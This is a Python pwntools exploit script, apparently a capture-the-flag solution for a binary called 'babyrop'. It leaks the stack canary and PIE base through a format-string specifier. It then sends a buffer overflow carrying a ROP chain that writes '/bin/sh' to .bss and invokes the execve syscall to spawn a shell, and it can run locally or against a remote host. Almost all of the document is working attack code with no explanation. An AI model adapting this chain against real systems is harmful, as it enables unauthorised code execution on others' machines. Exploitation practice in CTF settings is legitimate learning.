
#!/usr/bin/python3.8
from pwn import *
import os

os.chdir('../setup')
elf = context.binary = ELF("babyrop")
libc = elf.libc
context.terminal = ['tilix', '-a', 'session-add-down', '-e']
gs = '''
init-pwndbg
b *0x7ffff7f3a051
c
'''

# wrapper functrns
def sl(x): r.sendline(x)
def sla(x, y): r.sendlineafter(x, y)
def se(x): r.send(x)
def sa(x, y): r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        HOST = args.R.split(':')[0]
        PORT = args.R.split(':')[1]
        return remote(HOST, PORT)
    else:
        return process(elf.path)

r= run()
# =-=-=-= GADGETS / addresses -=-=-=-
# mov [rdi], rsi; ret;
MOV_RDI_RSI = 0x557cf
# pop rdi; ret
POP_RDI = 0x9bd2
# pop rsi; ret
POP_RSI = 0x1753e
# pop rdx; ret
POP_RDX = 0x9adf
# pop rax; ret;
POP_RAX = 0x597f7
# syscall
SYSCALL = 0x9643

# =-=-=-=-= Main Exploit -=-=-=
OFFSET = 72

# leak pie and canary
sl(b'%21$p.%22$p')
leaks = rl().strip().split(b'.')

canary = int(leaks[0], 16)
pie = int(leaks[1], 16)
elf.address = pie - elf.sym.__libc_csu_init
log_addr('canary', canary)
log_addr('pie base', elf.address)
b = elf.address

payload = [
    #cyclic(128, n=8),  # used to find offset
    b'A' * OFFSET,
    canary,
    b'B' * 8,  #cyclic(32, n=8)  # used to find offset between canary and RET
    b + POP_RDI,
    elf.bss(),
    b + POP_RSI,
    b'/bin/sh\x00',
    b + MOV_RDI_RSI,
    b + POP_RSI,
    0,
    b + POP_RDX,
    0,
    b + POP_RAX,
    0x3b,
    b + SYSCALL    
]

sl(flat(payload))

# ====================================
r.interactive()
